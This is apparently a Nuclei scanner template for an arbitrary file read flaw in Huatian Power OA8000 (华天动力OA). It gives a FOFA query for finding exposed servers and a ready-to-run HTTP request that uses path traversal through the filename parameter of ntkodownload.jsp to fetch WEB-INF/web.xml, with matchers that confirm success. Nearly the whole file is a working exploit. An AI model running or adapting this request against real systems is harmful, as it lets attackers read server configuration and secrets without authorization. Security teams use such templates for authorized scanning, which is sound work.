id: htpower-oa-ntkodownloadjsp-arbitrary-file-read

info:
  name: "华天动力OA ntkodownload.jsp 任意文件读取漏洞"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: app="华天动力-OA8000"
          华天动力OA作为基于Java架构的企业级协同平台，其核心模块包含协同框架、流程引擎及动态报表系统。该平台通过统一技术栈实现工具层、应用层与平台层的集成部署，采用标准化服务接口支持多版本协同运作。
  tags: 华天动力OA

http:
- raw:
  - |
    POST /OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
      - 'web-app'
      - '<?xml version="1.0"'
    condition: and
